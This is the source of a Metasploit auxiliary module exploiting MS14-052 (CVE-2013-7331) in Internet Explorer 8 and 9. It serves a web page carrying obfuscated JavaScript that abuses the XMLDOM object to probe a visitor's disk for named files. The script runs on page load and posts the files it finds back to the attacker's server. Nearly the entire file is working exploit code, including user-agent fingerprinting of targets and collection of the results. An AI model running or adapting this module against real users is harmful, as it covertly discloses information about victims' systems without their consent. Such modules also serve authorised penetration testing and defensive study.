##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/jsobfu'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::JSObfu

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS14-052 Microsoft Internet Explorer XMLDOM Filename Disclosure",
      'Description'    => %q{
        This module will use the Microsoft XMLDOM object to enumerate a remote machine's filenames.
        It will try to do so against Internet Explorer 8 and Internet Explorer 9. To use it, you
        must supply your own list of file paths. Each file path should look like this:
        c:\\\\windows\\\\system32\\\\calc.exe
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Soroush Dalili', # @irsdl - Original discovery. MSF module is from his PoC
          'sinn3r'
        ],
      'References'     =>
        [
          [ 'CVE', '2013-7331'],
          [ 'MSB', 'MS14-052' ],
          [ 'URL', 'https://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/' ],
          [ 'URL', 'https://www.alienvault.com/open-threat-exchange/blog/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi' ]
        ],
      'Platform'       => 'win',
      'DisclosureDate' => "Sep 9 2014", # MSB. Used in the wild since Feb 2014
      ))

    register_options(
      [
        OptPath.new('FILES', [ true, 'A list of files to enumerate. One absolute file path per line.' ])
      ], self.class
    )
  end

  def js
    target_files = parse_target_files
    js_target_files = target_files * ','

    %Q|
    #{js_ajax_post}

    var RESULTS = {
      UNKNOWN : {value: 0, message: "Unknown!", color: "black", data: ""},
      BADBROWSER: {value: 1, message: "Browser is not supported. You need IE!", color: "black", data: ""},
      FILEFOUND : {value: 2, message: "File was found!", color: "green", data: ""},
      FOLDERFOUND : {value: 3, message: "Folder was found!", color: "green", data: ""},
      NOTFOUND : {value: 4, message: "Object was not found!", color: "red", data: ""},
      ALIVE : {value: 5, message: "Alive address!", color: "green", data: ""},
      MAYBEALIVE : {value: 6, message: "Maybe an alive address!", color: "blue", data: ""},
      DEAD : {value: 7, message: "Dead to me! Undetectable?", color: "red", data: ""},
      VALIDDRIVE : {value: 8, message: "Available Drive!", color: "green", data: ""},
      INVALIDDRIVE : {value: 9, message: "Unavailable Drive!", color: "red", data: ""}
    };


    function validateXML(txt) {
      var result = RESULTS.UNKNOWN;

      if (window.ActiveXObject) {
        var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
        xmlDoc.async = true;
        try {
          xmlDoc.loadXML(txt);
          if (xmlDoc.parseError.errorCode != 0) {
            var err;
            err = "Error Code: " + xmlDoc.parseError.errorCode + "\\n";
            err += "Error Reason: " + xmlDoc.parseError.reason;
            err += "Error Line: " + xmlDoc.parseError.line;

            var errReason = xmlDoc.parseError.reason.toLowerCase();
            if (errReason.search('access is denied') >= 0)  {
              result = RESULTS.ALIVE;
            } else if(errReason.search('the system cannot locate the object') >= 0 \|\| errReason.search('the system cannot find the file') >= 0 \|\| errReason.search('the network path was not found') >= 0) {
              result = RESULTS.NOTFOUND;
            } else if(errReason!=''){
              result = RESULTS.FILEFOUND;
            } else{
              result = RESULTS.UNKNOWN; // No Error? Unknown!
            };
          } else {
            result = RESULTS.FILEFOUND;
          }
        } catch (e) {
          result = RESULTS.FOLDERFOUND;
        }
      } else {
        result = RESULTS.BADBROWSER;
      }
      result.data = "";

      return result;
    };


    function checkFiles(files) {
      var foundFiles = new Array();
      // the first one is for all drives, the others are for the C drive only!
      var preMagics = ["res://","\\\\\\\\localhost\\\\", "file:\\\\\\\\localhost\\\\", "file:\\\\"];
      // or any other irrelevant ADS! - we do not need this when we use Res://
      var postMagics = ["::$index_allocation"];

      var templateString = '<?xml version="1.0" ?><\!DOCTYPE anything SYSTEM "$target$">';

      for (var i = 0; i < files.length; i++) {
        var filename = files[i];
        if (filename != '') {
          filename = preMagics[0] + filename; // postMagics can be used too!
          var result = validateXML(templateString.replace("$target$", filename));
          if (result == RESULTS.FOLDERFOUND \|\| result == RESULTS.ALIVE) result = RESULTS.UNKNOWN;
          result.data = filename;
          if (result.message.search(/file was found/i) > -1) {
            var trimmedFilename = result.data;
            for (var prem in preMagics)   { trimmedFilename = trimmedFilename.replace(preMagics[prem], ''); }
            for (var postm in postMagics) { trimmedFilename = trimmedFilename.replace(postMagics[postm], ''); }
            foundFiles.push(trimmedFilename);
          }
        }
      }
      return foundFiles;
    };

    var foundFileString = "";

    window.onload = function() {
      var files = [#{js_target_files}];
      var foundFiles = checkFiles(files);
      for (var file in foundFiles) {
        foundFileString += foundFiles[file] + "\|";
      }
      postInfo("#{get_resource}/receiver/", foundFileString, true);
    };
    |
  end

  def html
    new_js = js_obfuscate(js)
    %Q|
    <html>
    <head>
    </head>
    <body>
    <script>
    #{new_js}
    </script>
    </body>
    </html>
    |
  end

  def run
    exploit
  end

  def parse_found_files(cli, req)
    return if req.body.blank?

    files = req.body.split('|')
    unless files.empty?
      print_good("We have detected the following files:")
      files.each do |f|
        report_note(host: cli.peerhost, type: 'ie.filenames', data: f)
        print_good(f)
      end
    end
  end

  def parse_target_files
    @files ||= lambda {
      files = []
      buf = ::File.open(datastore['FILES'], 'rb') { |f| buf = f.read }
      buf.each_line do |line|
        if line =~ /^[a-z]:\\\\.+/i
          files << "'#{line.strip}'"
        end
      end

      return files
    }.call
  end

  def is_target_suitable?(user_agent)
    info = fingerprint_user_agent(user_agent)
    if info[:ua_name] == HttpClients::IE && (info[:ua_ver] == '8.0' || info[:ua_ver] == '9.0')
      return true
    end

    false
  end

  def on_request_uri(cli, req)
    unless is_target_suitable?(req.headers['User-Agent'])
      send_not_found(cli)
      return
    end

    case req.uri
    when /receiver/
      parse_found_files(cli, req)
    else
      print_status("Sending HTML.")
      send_response(cli, html)
    end
  end
end
